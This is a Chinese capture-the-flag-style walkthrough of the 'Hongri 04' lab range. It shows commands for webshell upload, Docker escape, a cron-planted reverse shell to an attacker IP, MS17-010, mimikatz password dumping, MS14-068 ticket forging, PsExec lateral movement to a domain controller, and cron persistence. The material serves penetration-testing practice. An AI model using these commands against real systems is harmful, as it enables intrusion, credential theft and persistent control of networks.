---
title: "红日靶场04"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# 红日靶场04

### 环境配置

自定义一张网卡 vmnet1：`192.168.183.0`

将web主机添加一个NAT模式的网卡，再将所有主机（包括web）添加 vmnet1网卡

启动主机，先启动win7后再启动web（否则环境容易出问题）

主机密码：

* web：ubuntu:ubuntu
* DC：administrator:Test2008（登录提示密码过期，我这里更改为Admin123456）
* win7：douser:Dotest123

为了方便，登录主机后可以将win7的睡眠功能关掉，因为计算机休眠后sessions可能会断开：

![image-20240806153604053](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806153603891-186590894.png)

登录ubuntu，打开命令行，`sudo -s`提升为root权限，然后启动容器列表前三个docker：

![image-20240806154847207](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806154847103-503036554.png)

至此，环境搭建完毕，准备开打

### 信息搜集

#### IP探测

![image-20240806164219360](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806164219164-312534148.png)

确定IP为`192.168.111.134`

#### 端口扫描

![image-20240806164337626](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806164337227-1642669776.png)

发现开启了22、2001、2002、2003端口

#### 网页信息收集

依次访问三个端口看看：

##### 2001端口

![image-20240806164950615](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806164950195-993887778.png)

通过网页title可知是struts2框架，而struts2存在很多历史漏洞，那么思路就是对这个输入框进行漏洞检测

##### 2002端口

页面为tomcat，版本为8.5.19

![image-20240806170302277](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806170302030-1148725018.png)

同样可以使用漏扫器进行漏洞检测

##### 2003端口

页面是phpmyadmin，但我这里好像出问题了：

![image-20240806170738982](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806170738537-976605186.png)

问题不大，可以先尝试前两个端口有没有漏洞

### 漏洞利用

#### 2001端口 S2-045上传webshell

首先看看2001端口的struts2，附上工具链接：[shack2/Struts2VulsTools ](https://github.com/shack2/Struts2VulsTools/releases)

![image-20240806171908105](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806171907504-1774957912.png)

扫描发现存在S2-045和S2-046，那么试试用S2-045利用：

上传一个冰蝎webshell：

![image-20240806175318954](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806175318871-619033607.png)

冰蝎连接：

![image-20240806175357815](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806175357272-2014462907.png)

成功了

#### 2002端口 tomcat解析漏洞上传webshell

这个版本的话，可以试试put漏洞：

![image-20240806180639934](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806180639618-1717294082.png)

也是成功上传一个冰蝎马，连接一下：

![image-20240806180753041](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806180752826-841291824.png)

ok连上了，因为2003端口有点问题，所以就在这两个shell进行后渗透

### 后渗透

#### 环境识别

先简单信息收集一下：

![image-20240806182238091](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806182237597-913916321.png)

权限都是root，但这ip看起来不太正常呢，没懂

看看主机名：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806182811410-1317948151.png" alt="image-20240806182812010" style="zoom:150%;" />

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806183001440-2067327262.png" alt="image-20240806183001886" style="zoom:150%;" />

随机字符串，有点像虚拟容器哈

验证下看看是不是docker：

~~~shell
find / -name .dockerenv
~~~

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806182441705-327247445.png" alt="image-20240806182442243" style="zoom:150%;" />

结果发现两个shell都是docker，那就只有试试docker逃逸了

#### docker逃逸

将[CDK](https://github.com/cdk-team/CDK/releases/tag/v1.5.3)上传到两个docker中进行不安全配置扫描：

![image-20240806184600514](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806184559938-1645462036.png)

赋予权限并启动cdk：

~~~shell
./cdk* eva --full
~~~

首先是2001端口的docker：

![image-20240806185451700](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806185451222-1810220941.png)

不知道怎么回事失败了，再看看2002端口：
![image-20240806185834721](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806185834133-185562989.png)

这里检测到当前容器是以特权模式启动的，所以可以使用mount命令将物理机目录挂载到docker容器某个目录：

~~~shell
./cdk* run mount-disk
~~~

![image-20240806190812684](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806190812093-601056760.png)

ok，生成了目录`/tmp/cdk_11VI1`，cd进去看看：

![image-20240806190953089](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806190952384-1096713799.png)

确实挂载了根目录，那么接下来可以考虑写计划任务或者写SSH密钥，前者比较简单所以先试试：

~~~shell
echo "/bin/bash -i >& bash -i >& /dev/tcp/192.168.111.132/4444 0>&1" >> tmp/shell.sh
chmod 777 tmp/shell.sh
echo '*/2 * * * * root  bash /tmp/shell.sh' > etc/crontab
~~~

![image-20240806191817175](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806191816604-1505870275.png)

写入计划任务后kali监听拿到了物理机root权限的反弹shell：

![image-20240806191932145](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806191931820-556506061.png)

权限为root，至此，完成docker逃逸

#### 内网信息搜集

发现主机有内网网卡：

![image-20240806192358253](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806192358099-1430972775.png)

这里选择使用msf进行接下来的内网操作

首先用msf的马子上线，无需多言：

![image-20240806193310075](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806193311551-1952275386.png)

接下来就是配置路由：

![image-20240806193852227](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806193851787-1191449517.png)

完事

然后用frp搭建一个隧道，过程不做赘述，效果是这样：

![image-20240807022245176](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807022244950-954306269.png)

![image-20240807022258925](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807022258471-2124976948.png)

这样就搭好了

proxychains也修改一下conf：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807022718298-799432368.png" alt="image-20240807022719094" style="zoom:150%;" />

扫描域内主机：

~~~ shell
use auxiliary/scanner/discovery/udp_probe
set rhosts 192.168.183.0-255
set threads 5
run
~~~

![image-20240806211500082](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806211459994-1685010951.png)

发现了两台主机：

* TESTWIN7-PC：192.168.183.128
* WIN-ENS2VR5TR3N：192.168.183.130（还是DNS服务器，推测可能为域控）

可以用proxychain代理nmap进行端口扫描：

~~~shell
proxychains nmap -sP -p- 192.168.183.129
~~~

觉得nmap有点慢也可以用proxifier代理在windows上，然后用工具扫：
![image-20240806221023863](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806221023199-1840707096.png)

![image-20240806222437670](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806222437354-3390956.png)

完毕，大大的445啊，首先想到经典的ms17010永恒之蓝

#### 横向移动

##### ms17010上线域成员主机

这里要注意的是，攻击机在内网，所以paylaod应该选用正向即bind_tcp，并且最好把全局代理配上：

~~~shell
setg proxies socks5:127.0.0.1:8989
~~~

![image-20240806233433189](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806233433106-218951245.png)

成功了，为了保持稳定，把进程注入到winlog.exe里面，然后再试试域控能否利用永恒之蓝：

![image-20240806235133136](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806235133138-1019144894.png)

失败（有的文章说也能成功。。。），那么先操作域成员主机

先看看权限：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806235333226-1311057609.png" alt="image-20240806235333926" style="zoom:150%;" />

OK是system权限

再看看系统信息：

![image-20240806235909687](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806235909692-1348263098.png)

发现存在域`demo.com`，看看域内主机：

![image-20240807000954884](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807000954166-1656360451.png)

用mimikatz抓取一下密码：


![image-20240806235549714](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240806235549616-1714782678.png)

直接就抓到了：`Dotest123`

既然有了密码，首先就试试psexec：

![image-20240807001104268](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807001103768-1027603171.png)

寄，没有成功，因为靶场描述说要考查ms14068，所以怀疑这里要用域内提权来打DC，试试

##### ms14068域内提权

首先是把利用程序传上去（ms14-068.exe、mimikatz.exe和PsExec64.exe），这里靶机作者人挺好，程序都在上面我就不传了（不是因为我懒）

首先生成票据：

~~~shell
ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
~~~

![image-20240807005254755](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807005254246-1325241086.png)

mimikatz导入TGT：

~~~shell
kerberos::ptc TGT_douser@DEMO.COM.ccache
~~~

![image-20240807005638667](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807005638703-1245673923.png)

导入后再psexec横向移动试试

##### PsExec横向移动上线DC

这里使用PsExec64.exe前需要RDP连接该主机，因为这里拿到的DC的shell是一个弹窗

注册表开启RDP：

~~~cmd
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
~~~

![image-20240807012236646](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807012236241-1965524589.png)

然后用proxychains进行RDP连接：

![image-20240807012752002](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807012752273-2103209120.png)

这里报错了：

![image-20240807033027740](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807033027471-2116962130.png)

因为我们是system权限，可以改本地administrator账户的密码

~~~shell
net user administrator Admin123456
~~~

然后登录本地administrator，不登录到域：

![image-20240807045559735](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807045601229-1198451808.png)

这里又报错，需要再激活一下用户：

 ~~~shell
net user administrator /active:yes
 ~~~

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807045645882-1695052901.png" alt="image-20240807045645103" style="zoom:150%;" />

现在应该可以RDP了，登录本地administrator账户：

![image-20240807045950826](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807045952986-757964572.png)

成功登录

因为douser用户桌面有工具，所以我们打开他的桌面文件夹`C:\Users\douser\Desktop`：

![image-20240807050150229](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807050151552-20110350.png)

直接命令行启动PsExec64.exe进行横向移动：

~~~cmd
PsExec64.exe /accepteula /s \\WIN-ENS2VR5TR3N cmd
~~~

![image-20240807050436425](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807050437980-733542083.png)

成功获取到了DC的shell，确认一下信息：
![image-20240807050719900](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807050721046-1625656775.png)

ok没有问题

#### 权限维持

老套路，在出网的web主机上写计划任务即可，因为web主机上存有我们的msf木马（如果没有migrate迁移进程的话），所以可以这样写计划任务：

~~~shell
echo "* * * * * cd /root && ./mshell.elf" >> /var/spool/cron/crontabs/root
~~~

![image-20240807052114093](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807052115142-75771350.png)

这样就会每分钟执行依次木马，msf监听即可获得shell：

![image-20240807052423115](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240807052424555-528138006.png)

### 总结

本次实践用到的知识点与操作方法：

* struts2漏洞，利用S2-045成功getshell
* Tomcat解析漏洞，PUT上传冰蝎马getshell
* Docker逃逸，利用docker配置不当实现docker逃逸，获得内网宿主机权限
* frp搭建内网隧道代理，方便内网阶段的渗透
* ms17-010，永恒之蓝获得域成员主机的shell
* ms14-068，域内提权配合psexec横向移动控制DC
